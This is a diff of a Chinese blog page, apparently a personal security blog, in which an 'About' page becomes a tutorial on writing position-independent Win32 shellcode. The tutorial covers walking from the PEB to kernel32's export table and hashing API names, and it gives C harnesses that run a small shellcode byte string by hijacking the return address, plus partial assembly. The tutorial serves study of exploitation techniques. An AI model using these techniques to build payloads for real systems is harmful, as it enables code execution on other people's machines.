@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-<link rel="shortcut icon" href="https://tktkku.github.io/favicon.ico" type="image/x-icon" /><meta name="viewport"content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="apple-mobile-web-app-capable"content="yes"/><meta name="apple-mobile-web-app-status-bar-style"content="black"/><meta name="format-detection"content="telephone=no"/><meta name="renderer"content="webkit"><meta name="description"content="温故而知新"><meta charset="UTF-8"><title>关于 | Gridea</title>
+<link rel="shortcut icon" href="https://tktkku.github.io/favicon.ico" type="image/x-icon" /><meta name="viewport"content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="apple-mobile-web-app-capable"content="yes"/><meta name="apple-mobile-web-app-status-bar-style"content="black"/><meta name="format-detection"content="telephone=no"/><meta name="renderer"content="webkit"><meta name="description"content="温故而知新"><meta charset="UTF-8"><title>开发通用的shellcode | Gridea</title>
 <link href="https://tktkku.github.io/styles/main.css" type="text/css" rel="stylesheet" /><link href="https://at.alicdn.com/t/font_1621793_zatzzgvf30g.css" type="text/css" rel="stylesheet" /><link rel="stylesheet" href="https://tktkku.github.io/media/css/katex.css"><script async src="https://cdn.jsdelivr.net/npm/busuanzi@2.3.0/bsz.pure.mini.min.js"></script><script src="https://tktkku.github.io/media/js/magnify.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
 <script type="text/javascript">function btn_toggle(){document.getElementById("hn").classList.contains("no-js")?document.getElementById("hn").classList.remove("no-js"):document.getElementById("hn").classList.add("no-js")}</script>
 
-<link rel="canonical" href="https://tktkku.github.io/post/about/" />
+<link rel="canonical" href="https://tktkku.github.io/post/kai-fa-tong-yong-de-shellcode/" />
 </head>
 <body>
 <div class="progress"></div><style>.progress{background:linear-gradient(to right,#87ceeb var(--scroll),transparent 0);background-repeat:no-repeat;position:fixed;width:100%;height:4px;z-index:1}</style><div class="darkmode-background"></div><div class="darkmode-layer"></div>
@@ -23,21 +23,130 @@
 
 <div class="main"><div class="main-inner"><div class="content">
 <article class="post">
-<h2 class="post_title sm_margin"><a>关于</a></h2>
+<h2 class="post_title sm_margin"><a>开发通用的shellcode</a></h2>
 <script>function lan(){if(document.getElementById("lan").innerText=="繁"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_tw.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="简"}else{if(document.getElementById("lan").innerText=="簡"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_cn.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="繁"}}};</script>
-<section class="post_details"><i class="iconfont icon-calendar"></i><span style="margin-right:15px"> 2019-01-25</span><i class="iconfont icon-browse"></i><span style="margin-right:15px"> <span id="busuanzi_value_page_pv"></span> Views</span><i class="iconfont icon-category"></i><span class="weaklink" style="margin-right:15px"></span><i class="iconfont icon-caret-down"></i><span style="margin-right:15px">31字</span><i class="iconfont icon-naozhong"></i><span style="margin-right:15px">1 min read</span><a id="lan" href="javascript:void(0);"onclick="lan();"title="调整简繁体" style="margin-right:15px;">繁</a>
+<section class="post_details"><i class="iconfont icon-calendar"></i><span style="margin-right:15px"> 2021-07-03</span><i class="iconfont icon-browse"></i><span style="margin-right:15px"> <span id="busuanzi_value_page_pv"></span> Views</span><i class="iconfont icon-category"></i><span class="weaklink" style="margin-right:15px">	<a href="https://tktkku.github.io/tag/w77OkjPp8/" class="tag">shellcode</a> | 	<a href="https://tktkku.github.io/tag/dgRlk5xXnF/" class="tag">exploit</a></span><i class="iconfont icon-caret-down"></i><span style="margin-right:15px">809字</span><i class="iconfont icon-naozhong"></i><span style="margin-right:15px">4 min read</span><a id="lan" href="javascript:void(0);"onclick="lan();"title="调整简繁体" style="margin-right:15px;">繁</a>
 </section>
 
 <div style="display:flex">
 <div class="md_block" id="md_block">
 <div class="round-shape-one"></div>
-<blockquote>
-<p>欢迎来到我的小站呀，很高兴遇见你！🤝</p>
-</blockquote>
-<h2 id="关于本站">🏠 关于本站</h2>
-<h2 id="博主是谁">👨‍💻 博主是谁</h2>
-<h2 id="兴趣爱好">⛹ 兴趣爱好</h2>
-<h2 id="联系我呀">📬 联系我呀</h2>
+<h2 id="0x00定位api的原理">0x00定位API的原理</h2>
+<p>不同的操作系统版本，不同的补丁版本，函数对应的地址不尽相同。</p>
+<p>所有win_32程序都会加载ntdll.dll和kernel32.dll，可以同通过以下步骤动态地获得函数地址：</p>
+<ol>
+<li>通过段选择字FS在内存中找到当前的线程环境块TEB</li>
+<li>TEB偏移位置为0x30的地方存放着指向进程环境块PEB的指针</li>
+<li>PED偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针</li>
+<li>PEB_LDR_DATA偏移位置为0x1C的地方存放着指向模块初始化链表的头指针InInitializationOrderModuleList</li>
+<li>InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表节点时ntdll.dll，第二个链表节点是kernel32.dll</li>
+<li>找到属于kernel32.dll的节点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址</li>
+<li>从kernel32.dll的加载基址算起，偏移0x3C的地方就是其PE头</li>
+<li>PE头偏移0x78的地方存放着指向函数导出表的指针</li>
+<li>
+<ul>
+<li>导出表偏移0x1C处的指针指向储存导出函数偏移地址RVA的列表</li>
+<li>导出表偏移0x20处的指针指向存储导出函数函数名的列表</li>
+<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA</li>
+<li>获得RVA后，再加上前边已经得到的动态链接库的加载基址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是最终在shellcode中调用时需要的地址</li>
+</ul>
+</li>
+</ol>
+<h2 id="0x01-shellcode的调试与运行">0x01 shellcode的调试与运行</h2>
+<pre><code class="language-c++">char shellcode[]=&quot;\x66\x81\xEC\x40...&quot;;
+void main()
+{
+    __asm
+    {
+        lea eax,shellcode
+        push eax
+        ret//ret指令会返回eax中的地址给eip
+    }
+}
+</code></pre>
+<pre><code class="language-c++">#include &lt;stdio.h&gt;
+unsigned char shellcode[] =
+                        &quot;\x8b\xec\x68\x65\x78\x65&quot;
+                        &quot;\x20\x68\x63\x6d\x64\x2e&quot;
+                        &quot;\x8d\x45\xf8\x50\xb8\x8D&quot;
+                        &quot;\x15\x86\x7C\xff\xd0&quot;;
+int main ()
+{
+int *ret;
+ret=(int *)&amp;ret+2;//ret指向下面的第二个位置
+printf(&quot;Shellcode Length is : %d\n&quot;,strlen(shellcode));
+(*ret)=(int)shellcode; // eip设置为shellcode的地址
+return 0;
+}
+/*
+栈示意图
++-----------+
+| int *ret  |
++-----------+
+|    原ebp  |
++-----------+
+|返回地址    |
++-----------+
+*/
+</code></pre>
+<h2 id="0x02-动态定位api的shellcode">0x02 动态定位API的shellcode</h2>
+<p>为了使shellcode尽可能短，更加通用，在搜索函数名时，对其进行hash运算，在搜索时也进行同样的hash，这样只需要比较hash摘要就可以了。</p>
+<pre><code class="language-c++">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+DWORD GetHash(char *fun_name)
+{
+    DWORD digest = 0;
+    while (*fun_name)
+    {
+		digest = ((digest &lt;&lt; 25) | (digest &gt;&gt; 7));
+        
+        digest += *fun_name;
+        fun_name++;
+    }
+    return digest;
+}
+int main()
+{
+    DWORD hash;
+    hash = GetHash(&quot;MessageBoxA&quot;);
+    printf(&quot;result of hash is %.8x\n&quot;, hash);
+    return 0;
+}
+</code></pre>
+<pre><code class="language-c++">int main()
+{
+    __asm {
+        	CLD	;clear flag DF
+        	;store hash
+         	push 0x1e380a6a	;hash of MessageBoxA
+            push 0x4fd18963	;hash of ExitProcess
+            push 0x0c917432	;hash of LoadLibraryA
+            mov esi,esp		;esi=addr of first function hash
+            lea edi,[esi-0xc];edi=addr to start writing function
+            
+            ;make some stack space
+            xor ebx,ebx
+            mov bh,0x04
+            sub esp,ebx
+                
+            ;push a pointer to &quot;user32&quot; onto stack
+            mov bx,0x3233 ;rest of ebx is null
+            push ebx
+            push 0x72657375
+            push esp
+            xor edx,edx
+            
+            ;find base addr of kernel32.dll
+             mov ebx,fs:[edx+0x30] ;ebx=address of PEB
+             mov ecx,[ebx+0x0c] ;ecx=pointer to loader data
+             mov ecx,[ecx+0x1c]  ;ecx=first entry in initialization 								 ;order list
+            mov ecx,[ecx] ;ecx=second entry in list
+                 			;(kernel32.dll)
+        	mov ebp,[ecx+0x08];ebp=base address of kernel32.dll
+               
+    }
+}
+</code></pre>
 
 <span id="footnote"></span>
 <div id = "warn"></div>
@@ -45,10 +154,9 @@
 <div class="toc-container"><ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99">🏠 关于本站</a></li>
-<li><a href="#%E5%8D%9A%E4%B8%BB%E6%98%AF%E8%B0%81">👨‍💻 博主是谁</a></li>
-<li><a href="#%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD">⛹ 兴趣爱好</a></li>
-<li><a href="#%E8%81%94%E7%B3%BB%E6%88%91%E5%91%80">📬 联系我呀</a></li>
+<li><a href="#0x00%E5%AE%9A%E4%BD%8Dapi%E7%9A%84%E5%8E%9F%E7%90%86">0x00定位API的原理</a></li>
+<li><a href="#0x01-shellcode%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E8%BF%90%E8%A1%8C">0x01 shellcode的调试与运行</a></li>
+<li><a href="#0x02-%E5%8A%A8%E6%80%81%E5%AE%9A%E4%BD%8Dapi%E7%9A%84shellcode">0x02 动态定位API的shellcode</a></li>
 </ul>
 </li>
 </ul>
@@ -69,7 +177,7 @@ if(section.offsetTop<=fromTop){if(nextSection){if(nextSection.offsetTop>fromTop)
 var list=document.querySelectorAll(".katex");for(var i=0;i<list.length;i++){list[i].style.display="unset"};
 var h=document.documentElement,b=document.body,st="scrollTop",sh="scrollHeight",progress=document.querySelector(".progress"),scroll;document.addEventListener("scroll",function(){scroll=(h[st]||b[st])/((h[sh]||b[sh])-h.clientHeight)*100;progress.style.setProperty("--scroll",scroll+"%")});
 var wxScale=new WxScale({fullPage:document.querySelector("#fullPage"),canvas:document.querySelector("#canvas")});var imgBox=document.querySelectorAll("#md_block img");for(var i=0;i<imgBox.length;i++){imgBox[i].onclick=function(e){wxScale.start(this)}};
-content="本文最后更新于2019-01-25，已超过 1 年没有更新，涉及的内容可能已经失效！";var date1="2019-01-25 19:09:48";date1=date1.replace("-","/");var date2=new Date();var date3=date2.getTime()-new Date(date1).getTime();var days=Math.floor(date3/(24*3600*1000));if(days>=365){document.getElementById("warn").innerHTML=content};
+content="本文最后更新于2021-07-03，已超过 1 年没有更新，涉及的内容可能已经失效！";var date1="2021-07-03 14:26:41";date1=date1.replace("-","/");var date2=new Date();var date3=date2.getTime()-new Date(date1).getTime();var days=Math.floor(date3/(24*3600*1000));if(days>=365){document.getElementById("warn").innerHTML=content};
 </script>
 <style>#magnifyImg{position:fixed;left:0;top:0;text-align:center;width:100%;display:none;z-index:9999}#magnifyImg img{object-fit:contain;background:#eaecef;padding:15px;border-radius:10px;height:auto;width:auto;vertical-align:middle}</style>
 <a id="scrollUp" href="#top" style="position: fixed; z-index: 2147483647; display: block;"></a><div class="footer animated fadeInDown"><div class="site_footer"><div class="mysocials"><div class="my_socials"></div></div><div class="copyright"id="copyright">Copyright © 2018-2020 <a href="https://tktkku.github.io" style="margin:0;">Gridea</a>.</div>
